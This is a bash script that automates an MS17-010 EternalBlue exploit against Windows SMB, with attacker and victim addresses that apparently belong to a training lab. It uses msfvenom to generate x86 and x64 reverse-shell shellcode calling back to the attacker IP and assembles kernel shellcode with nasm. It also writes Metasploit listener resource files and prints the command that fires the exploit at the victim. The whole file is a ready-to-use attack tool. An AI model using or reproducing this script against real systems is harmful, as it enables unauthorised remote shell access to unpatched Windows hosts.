#!/bin/bash

# change these values to your attacking IP and 2 ports for 32bit/64bit Architecture
attackerIP=10.10.14.19 # put your ip here*
vulnerableIP=10.10.10.4  # put the victim ip here*
arch_x86_port=8888 # x86 msfconsole multi handler port (optional change)
arch_x64_port=9999 # x64 msfconsole multi handler port (optional change)

# Some nice colours cause... who the hell likes a dull terminal
BLACK='\033[0;30m'
DARKGREY='\033[1;30m'
RED='\033[0;31m'
LIGHTRED='\033[1;31m'
GREEN='\033[0;32m'
LITEGREEN='\033[1;32m'
BROWNORANGE='\033[0;33m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
LIGHTBLUE='\033[1;34m'
PURPLE='\033[0;35m'
LITEPURPLE='\033[1;35m'
CYAN='\033[0;36m'
LITECYAN='\033[1;36m'
LITEGREY='\033[0;37m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color


rm -rf $PWD/{output,bin}

mkdir -p $PWD/{output,bin}

# Metasploit console helper files.. cause who the hell likes typing this stuff 
msfconsoleX64File=$PWD"/output/EternalBlueX64.rc"
msfconsoleX86File=$PWD"/output/EternalBlueX86.rc"

# binary files generated by metasploit
x86_msf_shellcode=$PWD"/bin/sc_x86_msf.bin"
x64_msf_shellcode=$PWD"/bin/sc_x64_msf.bin"

x86_shellcode=$PWD"/bin/sc_x86.bin"
x64_shellcode=$PWD"/bin/sc_x64.bin"

# all our shellcode successfully compiled
all_shellcode=$PWD"/bin/sc_all.bin"

mergeScript=$PWD"/merge_shellcode.py"

# base file name of Worawits raw Assembly.
rawAssembly_x64=$PWD"/assembly/eternalblue_kshellcode_x64"
rawAssembly_x86=$PWD"/assembly/eternalblue_kshellcode_x86"

# remove all dynamically generate files to start fresh!
rm $rawAssembly_x64 $rawAssembly_x86 2>/dev/null

printf "${LITEGREY}##############################################################\n"
printf "#################### MS17-010 SMB EXPLOIT ####################\n"
printf "####### Generating Shellcode for x64 + x86 EternalBlue #######\n"
printf "################ x86 exploit uses Port: $arch_x86_port #################\n"
printf "################ x64 exploit uses Port: $arch_x64_port #################\n"
printf "##############################################################${NC}\n\n\n"

printf "Step 1 of 7..\n"
printf "${RED}1. GENERATING MSF SHELLCODE x64${NC}"
msfvenom -p windows/x64/shell_reverse_tcp -f raw -o $x64_msf_shellcode EXITFUNC=thread LHOST=$attackerIP LPORT=$arch_x64_port 2>/dev/null
printf "\n\n"

printf "Step 2 of 7..\n"
printf "${GREEN}2. GENERATING MSF SHELLCODE x86${NC}"
msfvenom -p windows/shell_reverse_tcp -f raw -o $x86_msf_shellcode EXITFUNC=thread LHOST=$attackerIP LPORT=$arch_x86_port 2>/dev/null
printf "\n\n"

printf "Step 3 of 7..\n"
printf "${PURPLE}3. GENERATING nasm SHELLCODE x64${NC}"
nasm -f bin $rawAssembly_x64.asm
printf "\n\n"

printf "Step 4 of 7..\n"
printf "${CYAN}4. GENERATING nasm SHELLCODE x86${NC}"
nasm -f bin $rawAssembly_x86.asm
printf "\n\n"

printf "Step 5 of 7..\n"
printf "${YELLOW}5. Combining nasm and MSF SHELLCODE to x86 binary${NC}"
cat $rawAssembly_x86 $x86_msf_shellcode > $x86_shellcode
printf "\n\n"

printf "Step 6 of 7..\n"
printf "${LITECYAN}6. Combining nasm and MSF SHELLCODE to x64 binary${NC}"
cat $rawAssembly_x64 $x64_msf_shellcode > $x64_shellcode
printf "\n\n"

printf "Step 7 of 7..\n"
printf "${BLUE}7. Finally Combining all of our binaries into 1 beast shellcode file for all architectures${NC}"
python $mergeScript $x86_shellcode $x64_shellcode $all_shellcode
printf "\n\n"


printf "${CYAN}Creating x86 MSF quick launch file..${NC}\n\n\r"

touch $msfconsoleX86File
echo "use exploit/multi/handler" >> $msfconsoleX86File
echo "set PAYLOAD windows/shell_reverse_tcp" >> $msfconsoleX86File
echo "set EXITFUNC thread" >> $msfconsoleX86File
echo "set ExitOnSession false" >> $msfconsoleX86File
echo "set LHOST $attackerIP" >> $msfconsoleX86File
echo "set LPORT $arch_x86_port" >> $msfconsoleX86File
echo "exploit -j" >> $msfconsoleX86File



printf "${CYAN}Creating x64 MSF quick launch file..${NC}\n\n\r"

touch $msfconsoleX64File
echo "use exploit/multi/handler" >> $msfconsoleX64File
echo "set PAYLOAD windows/x64/shell_reverse_tcp" >> $msfconsoleX64File
echo "set EXITFUNC thread" >> $msfconsoleX64File
echo "set ExitOnSession false" >> $msfconsoleX64File
echo "set LHOST $attackerIP" >> $msfconsoleX64File
echo "set LPORT $arch_x64_port" >> $msfconsoleX64File
echo "exploit -j" >> $msfconsoleX64File


printf "FINISHED!!!!...\n\n"
printf "${RED}Usage INSTRUCTIONS${NC}\n"
printf "Now you need to open 2 terminals and execute the following to active metasploit listeners..\n"
printf "for both x86 and x64 OS Architectures. If you already know the Systems Arch then you can just\n"
printf "use the following relevant metasploit run file we generated.\n"
printf "\n\n"

printf "${LITECYAN}For x64 bit Architecture:  ${NC}"
printf "msfconsole -r \"${msfconsoleX64File}\""
printf "\n\n"
printf "${LITECYAN}For x86 bit Architecture:  ${NC}"
printf "msfconsole -r \"${msfconsoleX86File}\""
printf "\n\n"

printf "${PURPLE} Now exploit using the Windows 7 script by running this: ${NC}\n\n\n"
printf "python $PWD/eternalblue_exploit7.py $vulnerableIP $all_shellcode 3\n\n"

